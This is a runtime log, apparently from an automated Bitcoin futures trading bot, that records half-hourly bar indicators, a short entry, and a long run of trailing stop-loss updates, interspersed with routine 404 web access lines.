+2026-05-31 19:30:01  INFO      feed.ws_feed — [FEED] FIX-PEAK-REST [Delta]: closed bar corrected | true_high=73952.00 true_low=73783.00 true_close=73847.50
+2026-05-31 19:30:01  INFO      feed.ws_feed — ✅ Bar confirmed [WS] | closed_boundary=1780234200000 | new_boundary=1780236000000 | bars=250 — evaluating signals...
+2026-05-31 19:30:01  INFO      main — [BAR] close=73847.50  atr=130.41  adx=14.0  rsi=44.1  trend=False  range=True  filters=OK  [atr=True body=True vol=True]
+2026-05-31 19:50:07  INFO      aiohttp.access — 45.198.224.186 [31/May/2026:19:50:07 +0530] "GET / HTTP/1.1" 404 175 "-" "Mozilla/5.0"
+2026-05-31 20:00:03  INFO      feed.ws_feed — [FEED] FIX-PEAK-REST [Delta]: closed bar corrected | true_high=73849.00 true_low=73455.00 true_close=73522.50
+2026-05-31 20:00:03  INFO      feed.ws_feed — ✅ Bar confirmed [WS] | closed_boundary=1780236000000 | new_boundary=1780237800000 | bars=250 — evaluating signals...
+2026-05-31 20:00:03  INFO      main — [BAR] close=73522.50  atr=149.24  adx=14.3  rsi=30.0  trend=False  range=True  filters=OK  [atr=True body=True vol=True]
+2026-05-31 20:15:30  INFO      aiohttp.access — 45.205.1.196 [31/May/2026:20:15:30 +0530] "GET / HTTP/1.1" 404 175 "-" "Mozilla/5.0"
+2026-05-31 20:24:44  INFO      aiohttp.access — 45.198.224.186 [31/May/2026:20:24:44 +0530] "GET / HTTP/1.1" 404 175 "-" "Mozilla/5.0"
+2026-05-31 20:30:00  INFO      feed.ws_feed — [FEED] FIX-PEAK-REST [Delta]: closed bar corrected | true_high=73720.00 true_low=73555.50 true_close=73574.50
+2026-05-31 20:30:00  INFO      feed.ws_feed — ✅ Bar confirmed [WS] | closed_boundary=1780237800000 | new_boundary=1780239600000 | bars=250 — evaluating signals...
+2026-05-31 20:30:00  INFO      main — [BAR] close=73574.50  atr=152.68  adx=15.1  rsi=33.7  trend=False  range=True  filters=FAIL  [atr=True body=False vol=True]
+2026-05-31 21:00:01  INFO      feed.ws_feed — [FEED] FIX-PEAK-REST [Delta]: closed bar corrected | true_high=73751.00 true_low=73557.00 true_close=73708.00
+2026-05-31 21:00:01  INFO      feed.ws_feed — ✅ Bar confirmed [WS] | closed_boundary=1780239600000 | new_boundary=1780241400000 | bars=250 — evaluating signals...
+2026-05-31 21:00:01  INFO      main — [BAR] close=73708.00  atr=155.63  adx=16.1  rsi=42.0  trend=False  range=True  filters=OK  [atr=True body=True vol=True]
+2026-05-31 21:02:12  INFO      aiohttp.access — 45.198.224.186 [31/May/2026:21:02:12 +0530] "GET / HTTP/1.1" 404 175 "-" "Mozilla/5.0"
+2026-05-31 21:30:01  INFO      feed.ws_feed — [FEED] FIX-PEAK-REST [Delta]: closed bar corrected | true_high=73725.50 true_low=73578.00 true_close=73631.00
+2026-05-31 21:30:01  INFO      feed.ws_feed — ✅ Bar confirmed [WS] | closed_boundary=1780241400000 | new_boundary=1780243200000 | bars=250 — evaluating signals...
+2026-05-31 21:30:01  INFO      main — [BAR] close=73631.00  atr=155.05  adx=17.2  rsi=39.0  trend=False  range=True  filters=OK  [atr=True body=True vol=True]
+2026-05-31 21:35:54  INFO      aiohttp.access — 45.198.224.186 [31/May/2026:21:35:54 +0530] "GET / HTTP/1.1" 404 175 "-" "Mozilla/5.0"
+2026-05-31 21:46:03  INFO      aiohttp.access — 45.205.1.196 [31/May/2026:21:46:03 +0530] "GET / HTTP/1.1" 404 175 "-" "Mozilla/5.0"
+2026-05-31 22:00:00  INFO      feed.ws_feed — [FEED] FIX-PEAK-REST [Delta]: closed bar corrected | true_high=73705.50 true_low=73488.00 true_close=73558.50
+2026-05-31 22:00:00  INFO      feed.ws_feed — ✅ Bar confirmed [WS] | closed_boundary=1780243200000 | new_boundary=1780245000000 | bars=250 — evaluating signals...
+2026-05-31 22:00:00  INFO      main — [BAR] close=73558.50  atr=159.51  adx=18.5  rsi=36.3  trend=False  range=False  filters=FAIL  [atr=True body=False vol=True]
+2026-05-31 22:15:29  INFO      aiohttp.access — 45.198.224.186 [31/May/2026:22:15:29 +0530] "GET / HTTP/1.1" 404 175 "-" "Mozilla/5.0"
+2026-05-31 22:30:01  INFO      feed.ws_feed — [FEED] FIX-PEAK-REST [Delta]: closed bar corrected | true_high=73581.50 true_low=73363.00 true_close=73492.50
+2026-05-31 22:30:01  INFO      feed.ws_feed — ✅ Bar confirmed [WS] | closed_boundary=1780245000000 | new_boundary=1780246800000 | bars=250 — evaluating signals...
+2026-05-31 22:30:01  INFO      main — [BAR] close=73492.50  atr=163.73  adx=20.1  rsi=34.0  trend=False  range=False  filters=OK  [atr=True body=True vol=True]
+2026-05-31 22:48:31  INFO      aiohttp.access — 45.198.224.186 [31/May/2026:22:48:31 +0530] "GET / HTTP/1.1" 404 175 "-" "Mozilla/5.0"
+2026-05-31 22:56:12  INFO      aiohttp.access — 45.205.1.196 [31/May/2026:22:56:12 +0530] "GET / HTTP/1.1" 404 175 "-" "Mozilla/5.0"
+2026-05-31 23:00:00  INFO      feed.ws_feed — [FEED] FIX-PEAK-REST [Delta]: closed bar corrected | true_high=73574.00 true_low=73438.00 true_close=73562.50
+2026-05-31 23:00:00  INFO      feed.ws_feed — ✅ Bar confirmed [WS] | closed_boundary=1780246800000 | new_boundary=1780248600000 | bars=250 — evaluating signals...
+2026-05-31 23:00:00  INFO      main — [BAR] close=73562.50  atr=161.75  adx=21.9  rsi=38.4  trend=False  range=False  filters=FAIL  [atr=True body=False vol=True]
+2026-05-31 23:25:50  INFO      aiohttp.access — 45.198.224.186 [31/May/2026:23:25:50 +0530] "GET / HTTP/1.1" 404 175 "-" "Mozilla/5.0"
+2026-05-31 23:30:01  INFO      feed.ws_feed — [FEED] FIX-PEAK-REST [Delta]: closed bar corrected | true_high=73711.50 true_low=73571.00 true_close=73668.50
+2026-05-31 23:30:01  INFO      feed.ws_feed — ✅ Bar confirmed [WS] | closed_boundary=1780248600000 | new_boundary=1780250400000 | bars=250 — evaluating signals...
+2026-05-31 23:30:01  INFO      main — [BAR] close=73668.50  atr=160.84  adx=23.1  rsi=44.5  trend=True  range=False  filters=OK  [atr=True body=True vol=True]
+2026-06-01 00:00:01  INFO      feed.ws_feed — [FEED] FIX-PEAK-REST [Delta]: closed bar corrected | true_high=73689.00 true_low=73576.50 true_close=73645.00
+2026-06-01 00:00:01  INFO      feed.ws_feed — ✅ Bar confirmed [WS] | closed_boundary=1780250400000 | new_boundary=1780252200000 | bars=250 — evaluating signals...
+2026-06-01 00:00:01  INFO      main — [BAR] close=73645.00  atr=157.38  adx=23.9  rsi=43.5  trend=True  range=False  filters=FAIL  [atr=True body=False vol=True]
+2026-06-01 00:02:22  INFO      aiohttp.access — 45.198.224.186 [01/Jun/2026:00:02:22 +0530] "GET / HTTP/1.1" 404 175 "-" "Mozilla/5.0"
+2026-06-01 00:12:45  INFO      aiohttp.access — 45.205.1.196 [01/Jun/2026:00:12:45 +0530] "GET / HTTP/1.1" 404 175 "-" "Mozilla/5.0"
+2026-06-01 00:30:00  INFO      feed.ws_feed — [FEED] FIX-PEAK-REST [Delta]: closed bar corrected | true_high=73687.50 true_low=73545.50 true_close=73614.00
+2026-06-01 00:30:00  INFO      feed.ws_feed — ✅ Bar confirmed [WS] | closed_boundary=1780252200000 | new_boundary=1780254000000 | bars=250 — evaluating signals...
+2026-06-01 00:30:00  INFO      main — [BAR] close=73614.00  atr=156.28  adx=24.6  rsi=42.1  trend=True  range=False  filters=FAIL  [atr=True body=False vol=True]
+2026-06-01 00:36:32  INFO      aiohttp.access — 45.198.224.186 [01/Jun/2026:00:36:32 +0530] "GET / HTTP/1.1" 404 175 "-" "Mozilla/5.0"
+2026-06-01 01:00:01  INFO      feed.ws_feed — [FEED] FIX-PEAK-REST [Delta]: closed bar corrected | true_high=73631.00 true_low=73427.00 true_close=73486.00
+2026-06-01 01:00:01  INFO      feed.ws_feed — ✅ Bar confirmed [WS] | closed_boundary=1780254000000 | new_boundary=1780255800000 | bars=250 — evaluating signals...
+2026-06-01 01:00:01  INFO      main — [BAR] close=73486.00  atr=159.69  adx=25.5  rsi=36.9  trend=True  range=False  filters=OK  [atr=True body=True vol=True]
+2026-06-01 01:00:01  INFO      main — [SIGNAL] Trend Short  is_long=False  regime=TREND
+2026-06-01 01:00:01  INFO      orders.manager — [OM] Placing entry | side=sell  qty=1  sl=73581.82  tp=73102.74
+2026-06-01 01:00:03  INFO      orders.manager — [OM] Entry filled | id=1339126436  fill=73505.00
+2026-06-01 01:00:03  INFO      orders.manager — [OM] ✅ Emergency bracket SL placed on Delta | sl=73581.82  (never amended — Python trail owns exits)
+2026-06-01 01:00:03  INFO      trail_loop — [TRAIL] Started | entry=73505.00 sl=73581.82 tp=73102.74 entry_atr=159.69 is_long=False | trail_pts=11.18 trail_off=31.94
+2026-06-01 01:00:03  INFO      trail_loop — [TRAIL] Signal bar OHLC (informational, not applied to trail) | high=73631.00 low=73427.00 close=73486.00 atr=159.69
+2026-06-01 01:00:03  INFO      main — [ENTRY] Filled | type=Trend Short  fill=73505.00  sl=73581.82  tp=73102.74  atr=159.69  stop_dist=95.82
+2026-06-01 01:00:03  INFO      infra.journal — Open trade recorded | Trend Short  qty=1 lots  entry=73505.00
+2026-06-01 01:00:03  INFO      trail_loop — [TRAIL] Source offset: binance=73526.00 delta=73505.00 offset=+21.00
+2026-06-01 01:00:04  INFO      infra.telegram — Telegram sent: '🔴 <b>ENTRY — SHORT</b>  |  <code>1</code> lot  (0.0010 BTC)\n<code>2026-06-01 01:00:03 IST</code>\n\nFill  : <b>$73,505.00</b>\nSL    : <code>$73,581.82</code>  (-76.82)\nTP    : <code>$73,102.74</code>  (+402.26)\nATR   : <code>159.69</code>  |  R:R <code>5.24</code>'
+2026-06-01 01:00:34  INFO      trail_loop — [TRAIL] Offset recalibrated: +21.00 → +21.93 (binance=73543.82 delta=73521.89)
+2026-06-01 01:01:04  INFO      trail_loop — [TRAIL] Offset recalibrated: +21.93 → +12.89 (binance=73520.89 delta=73508.00)
+2026-06-01 01:01:28  INFO      trail_loop — [TRAIL] Trail SL: 73581.82 → 73522.02 (stage 0 best=73490.09 src=arm_tick)
+2026-06-01 01:01:28  INFO      trail_loop — [TRAIL] Trail ARMED | price=73490.09 act_price=73493.82 trail_sl=73522.02 trail_pts=11.18 trail_off=31.94
+2026-06-01 01:01:33  INFO      trail_loop — [TRAIL] Trail SL: 73522.02 → 73515.98 (stage 0 best=73484.04 src=tick)
+2026-06-01 01:01:35  INFO      trail_loop — [TRAIL] Offset recalibrated: +12.89 → +29.96 (binance=73514.00 delta=73484.04)
+2026-06-01 01:01:36  INFO      trail_loop — [TRAIL] Trail SL: 73515.98 → 73515.97 (stage 0 best=73484.03 src=tick)
+2026-06-01 01:01:36  INFO      trail_loop — [TRAIL] Trail SL: 73515.97 → 73515.96 (stage 0 best=73484.02 src=tick)
+2026-06-01 01:01:36  INFO      trail_loop — [TRAIL] Trail SL: 73515.96 → 73515.91 (stage 0 best=73483.97 src=tick)
+2026-06-01 01:01:36  INFO      trail_loop — [TRAIL] Trail SL: 73515.91 → 73515.32 (stage 0 best=73483.38 src=tick)
+2026-06-01 01:01:36  INFO      trail_loop — [TRAIL] Trail SL: 73515.32 → 73515.07 (stage 0 best=73483.13 src=tick)
+2026-06-01 01:01:37  INFO      trail_loop — [TRAIL] Trail SL: 73515.07 → 73515.06 (stage 0 best=73483.12 src=tick)
+2026-06-01 01:01:39  INFO      trail_loop — [TRAIL] Trail SL: 73515.06 → 73515.05 (stage 0 best=73483.11 src=tick)
+2026-06-01 01:01:39  INFO      trail_loop — [TRAIL] Trail SL: 73515.05 → 73515.04 (stage 0 best=73483.10 src=tick)
+2026-06-01 01:01:39  INFO      trail_loop — [TRAIL] Trail SL: 73515.04 → 73514.99 (stage 0 best=73483.05 src=tick)
+2026-06-01 01:01:39  INFO      trail_loop — [TRAIL] Trail SL: 73514.99 → 73514.58 (stage 0 best=73482.64 src=tick)
+2026-06-01 01:01:39  INFO      trail_loop — [TRAIL] Trail SL: 73514.58 → 73514.40 (stage 0 best=73482.46 src=tick)
+2026-06-01 01:01:39  INFO      trail_loop — [TRAIL] Trail SL: 73514.40 → 73514.16 (stage 0 best=73482.22 src=tick)
+2026-06-01 01:01:39  INFO      trail_loop — [TRAIL] Trail SL: 73514.16 → 73513.99 (stage 0 best=73482.05 src=tick)
+2026-06-01 01:01:39  INFO      trail_loop — [TRAIL] Trail SL: 73513.99 → 73513.98 (stage 0 best=73482.04 src=tick)
+2026-06-01 01:01:39  INFO      trail_loop — [TRAIL] Trail SL: 73513.98 → 73513.92 (stage 0 best=73481.98 src=tick)
+2026-06-01 01:01:39  INFO      trail_loop — [TRAIL] Trail SL: 73513.92 → 73513.90 (stage 0 best=73481.96 src=tick)
+2026-06-01 01:01:39  INFO      trail_loop — [TRAIL] Trail SL: 73513.90 → 73513.84 (stage 0 best=73481.90 src=tick)
+2026-06-01 01:01:39  INFO      trail_loop — [TRAIL] Trail SL: 73513.84 → 73513.66 (stage 0 best=73481.72 src=tick)
+2026-06-01 01:01:39  INFO      trail_loop — [TRAIL] Trail SL: 73513.66 → 73513.54 (stage 0 best=73481.60 src=tick)
+2026-06-01 01:01:39  INFO      trail_loop — [TRAIL] Trail SL: 73513.54 → 73513.53 (stage 0 best=73481.59 src=tick)
+2026-06-01 01:01:39  INFO      trail_loop — [TRAIL] Trail SL: 73513.53 → 73513.10 (stage 0 best=73481.16 src=tick)
+2026-06-01 01:01:39  INFO      trail_loop — [TRAIL] Trail SL: 73513.10 → 73513.09 (stage 0 best=73481.15 src=tick)
+2026-06-01 01:01:39  INFO      trail_loop — [TRAIL] Trail SL: 73513.09 → 73513.08 (stage 0 best=73481.14 src=tick)
+2026-06-01 01:01:39  INFO      trail_loop — [TRAIL] Trail SL: 73513.08 → 73512.07 (stage 0 best=73480.13 src=tick)
+2026-06-01 01:01:39  INFO      trail_loop — [TRAIL] Trail SL: 73512.07 → 73512.03 (stage 0 best=73480.09 src=tick)
+2026-06-01 01:01:39  INFO      trail_loop — [TRAIL] Trail SL: 73512.03 → 73511.99 (stage 0 best=73480.05 src=tick)
+2026-06-01 01:01:39  INFO      trail_loop — [TRAIL] Trail SL: 73511.99 → 73511.98 (stage 0 best=73480.04 src=tick)
+2026-06-01 01:01:39  INFO      trail_loop — [TRAIL] Trail SL: 73511.98 → 73510.47 (stage 0 best=73478.53 src=tick)
+2026-06-01 01:01:39  INFO      trail_loop — [TRAIL] Trail SL: 73510.47 → 73510.31 (stage 0 best=73478.37 src=tick)
+2026-06-01 01:01:39  INFO      trail_loop — [TRAIL] Trail SL: 73510.31 → 73509.99 (stage 0 best=73478.05 src=tick)
+2026-06-01 01:01:39  INFO      trail_loop — [TRAIL] Trail SL: 73509.99 → 73509.98 (stage 0 best=73478.04 src=tick)
+2026-06-01 01:01:39  INFO      trail_loop — [TRAIL] Trail SL: 73509.98 → 73509.85 (stage 0 best=73477.91 src=tick)
+2026-06-01 01:01:39  INFO      trail_loop — [TRAIL] Trail SL: 73509.85 → 73509.72 (stage 0 best=73477.78 src=tick)
+2026-06-01 01:01:39  INFO      trail_loop — [TRAIL] Trail SL: 73509.72 → 73509.12 (stage 0 best=73477.18 src=tick)
+2026-06-01 01:01:39  INFO      trail_loop — [TRAIL] Trail SL: 73509.12 → 73509.11 (stage 0 best=73477.17 src=tick)
+2026-06-01 01:01:39  INFO      trail_loop — [TRAIL] Trail SL: 73509.11 → 73508.65 (stage 0 best=73476.71 src=tick)
+2026-06-01 01:01:39  INFO      trail_loop — [TRAIL] Trail SL: 73508.65 → 73508.63 (stage 0 best=73476.69 src=tick)
+2026-06-01 01:01:39  INFO      trail_loop — [TRAIL] Trail SL: 73508.63 → 73508.62 (stage 0 best=73476.68 src=tick)
+2026-06-01 01:01:39  INFO      trail_loop — [TRAIL] Trail SL: 73508.62 → 73508.15 (stage 0 best=73476.21 src=tick)
+2026-06-01 01:01:39  INFO      trail_loop — [TRAIL] Trail SL: 73508.15 → 73508.14 (stage 0 best=73476.20 src=tick)
+2026-06-01 01:01:39  INFO      trail_loop — [TRAIL] Trail SL: 73508.14 → 73508.09 (stage 0 best=73476.15 src=tick)
+2026-06-01 01:01:39  INFO      trail_loop — [TRAIL] Trail SL: 73508.09 → 73508.00 (stage 0 best=73476.06 src=tick)
+2026-06-01 01:01:39  INFO      trail_loop — [TRAIL] Trail SL: 73508.00 → 73507.98 (stage 0 best=73476.04 src=tick)
+2026-06-01 01:01:39  INFO      trail_loop — [TRAIL] Trail SL: 73507.98 → 73507.81 (stage 0 best=73475.87 src=tick)
+2026-06-01 01:01:39  INFO      trail_loop — [TRAIL] Trail SL: 73507.81 → 73507.43 (stage 0 best=73475.49 src=tick)
+2026-06-01 01:01:39  INFO      trail_loop — [TRAIL] Trail SL: 73507.43 → 73506.78 (stage 0 best=73474.84 src=tick)
+2026-06-01 01:01:39  INFO      trail_loop — [TRAIL] Trail SL: 73506.78 → 73506.58 (stage 0 best=73474.64 src=tick)
+2026-06-01 01:01:39  INFO      trail_loop — [TRAIL] Trail SL: 73506.58 → 73506.57 (stage 0 best=73474.63 src=tick)
+2026-06-01 01:01:39  INFO      trail_loop — [TRAIL] Trail SL: 73506.57 → 73506.53 (stage 0 best=73474.59 src=tick)
+2026-06-01 01:01:39  INFO      trail_loop — [TRAIL] Trail SL: 73506.53 → 73506.30 (stage 0 best=73474.36 src=tick)
+2026-06-01 01:01:39  INFO      trail_loop — [TRAIL] Trail SL: 73506.30 → 73506.11 (stage 0 best=73474.17 src=tick)
+2026-06-01 01:01:39  INFO      trail_loop — [TRAIL] Trail SL: 73506.11 → 73505.99 (stage 0 best=73474.05 src=tick)
+2026-06-01 01:01:39  INFO      trail_loop — [TRAIL] Trail SL: 73505.99 → 73505.98 (stage 0 best=73474.04 src=tick)
+2026-06-01 01:01:39  INFO      trail_loop — [TRAIL] Trail SL: 73505.98 → 73505.70 (stage 0 best=73473.76 src=tick)
+2026-06-01 01:01:39  INFO      trail_loop — [TRAIL] Trail SL: 73505.70 → 73505.64 (stage 0 best=73473.70 src=tick)
+2026-06-01 01:01:39  INFO      trail_loop — [TRAIL] Trail SL: 73505.64 → 73505.31 (stage 0 best=73473.37 src=tick)
+2026-06-01 01:01:39  INFO      trail_loop — [TRAIL] Trail SL: 73505.31 → 73504.82 (stage 0 best=73472.88 src=tick)
+2026-06-01 01:01:39  INFO      trail_loop — [TRAIL] Trail SL: 73504.82 → 73504.80 (stage 0 best=73472.86 src=tick)
+2026-06-01 01:01:39  INFO      trail_loop — [TRAIL] Trail SL: 73504.80 → 73504.79 (stage 0 best=73472.85 src=tick)
+2026-06-01 01:01:39  INFO      trail_loop — [TRAIL] Trail SL: 73504.79 → 73504.77 (stage 0 best=73472.83 src=tick)
+2026-06-01 01:01:39  INFO      trail_loop — [TRAIL] Trail SL: 73504.77 → 73504.75 (stage 0 best=73472.81 src=tick)
+2026-06-01 01:01:39  INFO      trail_loop — [TRAIL] Trail SL: 73504.75 → 73504.73 (stage 0 best=73472.79 src=tick)
+2026-06-01 01:01:39  INFO      trail_loop — [TRAIL] Trail SL: 73504.73 → 73504.72 (stage 0 best=73472.78 src=tick)
+2026-06-01 01:01:39  INFO      trail_loop — [TRAIL] Trail SL: 73504.72 → 73504.71 (stage 0 best=73472.77 src=tick)
+2026-06-01 01:01:39  INFO      trail_loop — [TRAIL] Trail SL: 73504.71 → 73504.70 (stage 0 best=73472.76 src=tick)
+2026-06-01 01:01:39  INFO      trail_loop — [TRAIL] Trail SL: 73504.70 → 73504.50 (stage 0 best=73472.56 src=tick)
+2026-06-01 01:01:39  INFO      trail_loop — [TRAIL] Trail SL: 73504.50 → 73504.46 (stage 0 best=73472.52 src=tick)
+2026-06-01 01:01:39  INFO      trail_loop — [TRAIL] Trail SL: 73504.46 → 73504.44 (stage 0 best=73472.50 src=tick)
+2026-06-01 01:01:39  INFO      trail_loop — [TRAIL] Trail SL: 73504.44 → 73504.11 (stage 0 best=73472.17 src=tick)
+2026-06-01 01:01:39  INFO      trail_loop — [TRAIL] Trail SL: 73504.11 → 73503.98 (stage 0 best=73472.04 src=tick)
+2026-06-01 01:01:39  INFO      trail_loop — [TRAIL] Trail SL: 73503.98 → 73503.77 (stage 0 best=73471.83 src=tick)
+2026-06-01 01:01:39  INFO      trail_loop — [TRAIL] Trail SL: 73503.77 → 73503.76 (stage 0 best=73471.82 src=tick)
+2026-06-01 01:01:39  INFO      trail_loop — [TRAIL] Trail SL: 73503.76 → 73503.47 (stage 0 best=73471.53 src=tick)
+2026-06-01 01:01:39  INFO      trail_loop — [TRAIL] Trail SL: 73503.47 → 73503.46 (stage 0 best=73471.52 src=tick)
+2026-06-01 01:01:39  INFO      trail_loop — [TRAIL] Trail SL: 73503.46 → 73503.29 (stage 0 best=73471.35 src=tick)
+2026-06-01 01:01:39  INFO      trail_loop — [TRAIL] Trail SL: 73503.29 → 73503.28 (stage 0 best=73471.34 src=tick)
+2026-06-01 01:01:39  INFO      trail_loop — [TRAIL] Trail SL: 73503.28 → 73503.16 (stage 0 best=73471.22 src=tick)
+2026-06-01 01:01:39  INFO      trail_loop — [TRAIL] Trail SL: 73503.16 → 73503.09 (stage 0 best=73471.15 src=tick)
+2026-06-01 01:01:39  INFO      trail_loop — [TRAIL] Trail SL: 73503.09 → 73502.98 (stage 0 best=73471.04 src=tick)
+2026-06-01 01:01:39  INFO      trail_loop — [TRAIL] Trail SL: 73502.98 → 73502.84 (stage 0 best=73470.90 src=tick)
+2026-06-01 01:01:39  INFO      trail_loop — [TRAIL] Trail SL: 73502.84 → 73502.82 (stage 0 best=73470.88 src=tick)
+2026-06-01 01:01:39  INFO      trail_loop — [TRAIL] Trail SL: 73502.82 → 73502.62 (stage 0 best=73470.68 src=tick)
+2026-06-01 01:01:39  INFO      trail_loop — [TRAIL] Trail SL: 73502.62 → 73502.54 (stage 0 best=73470.60 src=tick)
+2026-06-01 01:01:39  INFO      trail_loop — [TRAIL] Trail SL: 73502.54 → 73502.46 (stage 0 best=73470.52 src=tick)
+2026-06-01 01:01:39  INFO      trail_loop — [TRAIL] Trail SL: 73502.46 → 73502.14 (stage 0 best=73470.20 src=tick)
+2026-06-01 01:01:39  INFO      trail_loop — [TRAIL] Trail SL: 73502.14 → 73502.12 (stage 0 best=73470.18 src=tick)
+2026-06-01 01:01:39  INFO      trail_loop — [TRAIL] Trail SL: 73502.12 → 73502.10 (stage 0 best=73470.16 src=tick)
+2026-06-01 01:01:39  INFO      trail_loop — [TRAIL] Trail SL: 73502.10 → 73501.98 (stage 0 best=73470.04 src=tick)
+2026-06-01 01:02:06  INFO      trail_loop — [TRAIL] Offset recalibrated: +29.96 → +14.06 (binance=73504.83 delta=73490.77)
+2026-06-01 01:02:28  INFO      trail_loop — [TRAIL] Trail SL: 73501.98 → 73498.76 (stage 0 best=73466.82 src=tick)
+2026-06-01 01:02:33  INFO      trail_loop — [TRAIL] Trail SL: 73498.76 → 73497.89 (stage 0 best=73465.95 src=tick)
+2026-06-01 01:02:37  INFO      trail_loop — [TRAIL] Offset recalibrated: +14.06 → +20.05 (binance=73486.00 delta=73465.95)
+2026-06-01 01:02:38  INFO      trail_loop — [TRAIL] Trail SL: 73497.89 → 73486.20 (stage 0 best=73454.26 src=tick)
+2026-06-01 01:03:09  INFO      trail_loop — [TRAIL] Offset recalibrated: +20.05 → +19.70 (binance=73486.58 delta=73466.88)
+2026-06-01 01:03:23  INFO      trail_loop — [TRAIL] Trail SL: 73486.20 → 73480.61 (stage 0 best=73448.67 src=tick)
+2026-06-01 01:03:25  INFO      trail_loop — [TRAIL] Trail SL: 73480.61 → 73480.25 (stage 0 best=73448.31 src=tick)
+2026-06-01 01:03:25  INFO      trail_loop — [TRAIL] Trail SL: 73480.25 → 73480.24 (stage 0 best=73448.30 src=tick)
+2026-06-01 01:03:25  INFO      trail_loop — [TRAIL] Trail SL: 73480.24 → 73480.14 (stage 0 best=73448.20 src=tick)
+2026-06-01 01:03:25  INFO      trail_loop — [TRAIL] Trail SL: 73480.14 → 73479.76 (stage 0 best=73447.82 src=tick)
+2026-06-01 01:03:25  INFO      trail_loop — [TRAIL] Trail SL: 73479.76 → 73479.73 (stage 0 best=73447.79 src=tick)
+2026-06-01 01:03:25  INFO      trail_loop — [TRAIL] Trail SL: 73479.73 → 73478.70 (stage 0 best=73446.76 src=tick)
+2026-06-01 01:03:25  INFO      trail_loop — [TRAIL] Trail SL: 73478.70 → 73478.26 (stage 0 best=73446.32 src=tick)
+2026-06-01 01:03:25  INFO      trail_loop — [TRAIL] Trail SL: 73478.26 → 73478.25 (stage 0 best=73446.31 src=tick)
+2026-06-01 01:03:25  INFO      trail_loop — [TRAIL] Trail SL: 73478.25 → 73478.24 (stage 0 best=73446.30 src=tick)
+2026-06-01 01:03:28  INFO      trail_loop — [TRAIL] Trail SL: 73478.24 → 73471.32 (stage 0 best=73439.38 src=tick)
+2026-06-01 01:03:38  INFO      trail_loop — [TRAIL] Trail SL: 73471.32 → 73469.09 (stage 0 best=73437.15 src=tick)
+2026-06-01 01:03:40  INFO      trail_loop — [TRAIL] Offset recalibrated: +19.70 → +28.85 (binance=73466.00 delta=73437.15)
+2026-06-01 01:03:48  INFO      trail_loop — [TRAIL] Trail SL: 73469.09 → 73468.36 (stage 0 best=73436.42 src=tick)
+2026-06-01 01:03:53  INFO      trail_loop — [TRAIL] Trail SL: 73468.36 → 73468.03 (stage 0 best=73436.09 src=tick)
+2026-06-01 01:03:55  INFO      trail_loop — [TRAIL] Trail SL: 73468.03 → 73467.71 (stage 0 best=73435.77 src=tick)
+2026-06-01 01:03:55  INFO      trail_loop — [TRAIL] Trail SL: 73467.71 → 73467.70 (stage 0 best=73435.76 src=tick)
+2026-06-01 01:03:55  INFO      trail_loop — [TRAIL] Trail SL: 73467.70 → 73467.63 (stage 0 best=73435.69 src=tick)
+2026-06-01 01:03:55  INFO      trail_loop — [TRAIL] Trail SL: 73467.63 → 73467.30 (stage 0 best=73435.36 src=tick)
+2026-06-01 01:03:55  INFO      trail_loop — [TRAIL] Trail SL: 73467.30 → 73467.10 (stage 0 best=73435.16 src=tick)
+2026-06-01 01:03:55  INFO      trail_loop — [TRAIL] Trail SL: 73467.10 → 73467.09 (stage 0 best=73435.15 src=tick)
+2026-06-01 01:03:55  INFO      trail_loop — [TRAIL] Trail SL: 73467.09 → 73466.93 (stage 0 best=73434.99 src=tick)
+2026-06-01 01:03:55  INFO      trail_loop — [TRAIL] Trail SL: 73466.93 → 73466.89 (stage 0 best=73434.95 src=tick)
+2026-06-01 01:03:55  INFO      trail_loop — [TRAIL] Trail SL: 73466.89 → 73466.45 (stage 0 best=73434.51 src=tick)
+2026-06-01 01:03:55  INFO      trail_loop — [TRAIL] Trail SL: 73466.45 → 73465.11 (stage 0 best=73433.17 src=tick)
+2026-06-01 01:03:55  INFO      trail_loop — [TRAIL] Trail SL: 73465.11 → 73465.10 (stage 0 best=73433.16 src=tick)
+2026-06-01 01:03:55  INFO      trail_loop — [TRAIL] Trail SL: 73465.10 → 73465.09 (stage 0 best=73433.15 src=tick)
+2026-06-01 01:03:55  INFO      trail_loop — [TRAIL] Trail SL: 73465.09 → 73464.94 (stage 0 best=73433.00 src=tick)
+2026-06-01 01:03:55  INFO      trail_loop — [TRAIL] Trail SL: 73464.94 → 73464.93 (stage 0 best=73432.99 src=tick)
+2026-06-01 01:03:55  INFO      trail_loop — [TRAIL] Trail SL: 73464.93 → 73464.76 (stage 0 best=73432.82 src=tick)
+2026-06-01 01:03:55  INFO      trail_loop — [TRAIL] Trail SL: 73464.76 → 73464.73 (stage 0 best=73432.79 src=tick)
+2026-06-01 01:03:55  INFO      trail_loop — [TRAIL] Trail SL: 73464.73 → 73464.56 (stage 0 best=73432.62 src=tick)
+2026-06-01 01:03:55  INFO      trail_loop — [TRAIL] Trail SL: 73464.56 → 73464.55 (stage 0 best=73432.61 src=tick)
+2026-06-01 01:03:55  INFO      trail_loop — [TRAIL] Trail SL: 73464.55 → 73463.65 (stage 0 best=73431.71 src=tick)
+2026-06-01 01:03:55  INFO      trail_loop — [TRAIL] Trail SL: 73463.65 → 73463.61 (stage 0 best=73431.67 src=tick)
+2026-06-01 01:03:55  INFO      trail_loop — [TRAIL] Trail SL: 73463.61 → 73463.25 (stage 0 best=73431.31 src=tick)
+2026-06-01 01:03:55  INFO      trail_loop — [TRAIL] Trail SL: 73463.25 → 73463.24 (stage 0 best=73431.30 src=tick)
+2026-06-01 01:03:55  INFO      trail_loop — [TRAIL] Trail SL: 73463.24 → 73463.10 (stage 0 best=73431.16 src=tick)
+2026-06-01 01:03:55  INFO      trail_loop — [TRAIL] Trail SL: 73463.10 → 73463.09 (stage 0 best=73431.15 src=tick)
+2026-06-01 01:03:55  INFO      trail_loop — [TRAIL] Trail SL: 73463.09 → 73463.08 (stage 0 best=73431.14 src=tick)
+2026-06-01 01:03:55  INFO      trail_loop — [TRAIL] Trail SL: 73463.08 → 73462.47 (stage 0 best=73430.53 src=tick)
+2026-06-01 01:03:55  INFO      trail_loop — [TRAIL] Trail SL: 73462.47 → 73462.32 (stage 0 best=73430.38 src=tick)
+2026-06-01 01:03:55  INFO      trail_loop — [TRAIL] Trail SL: 73462.32 → 73462.11 (stage 0 best=73430.17 src=tick)
+2026-06-01 01:03:55  INFO      trail_loop — [TRAIL] Trail SL: 73462.11 → 73461.44 (stage 0 best=73429.50 src=tick)
+2026-06-01 01:03:55  INFO      trail_loop — [TRAIL] Trail SL: 73461.44 → 73461.43 (stage 0 best=73429.49 src=tick)
